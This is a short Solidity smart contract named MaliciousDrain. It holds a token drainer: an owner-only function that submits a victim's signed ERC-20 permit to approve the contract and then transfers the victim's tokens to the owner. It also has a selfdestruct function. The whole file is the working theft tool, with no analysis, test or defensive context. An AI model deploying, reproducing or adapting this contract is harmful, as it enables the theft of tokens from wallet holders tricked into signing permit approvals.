// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MaliciousDrain {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function drainTokensWithPermit(
        address token,
        address victim,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(msg.sender == owner, "Only owner");

        IERC20Permit(token).permit(victim, address(this), amount, deadline, v, r, s);
        IERC20Permit(token).transferFrom(victim, owner, amount);
    }

    function selfDestruct() external {
        require(msg.sender == owner, "Only owner");
        selfdestruct(payable(owner));
    }
}
